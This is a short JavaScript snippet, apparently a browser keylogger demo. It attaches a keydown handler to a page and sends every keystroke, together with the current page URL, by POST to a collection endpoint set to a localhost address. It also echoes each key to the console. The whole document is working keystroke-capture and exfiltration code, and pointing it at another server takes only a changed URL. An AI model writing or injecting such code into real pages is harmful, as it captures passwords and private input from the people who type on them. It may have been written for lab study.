server_url = "http://127.0.0.1:8000/keylog"

document.onkeydown = function(e) {
    var current_page = document.location.href
    console.log("Key pressed: " + e.key)
    param = {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({url: current_page, keys: e.key}),
    }
    fetch(server_url, param)
    console.log(param)
} 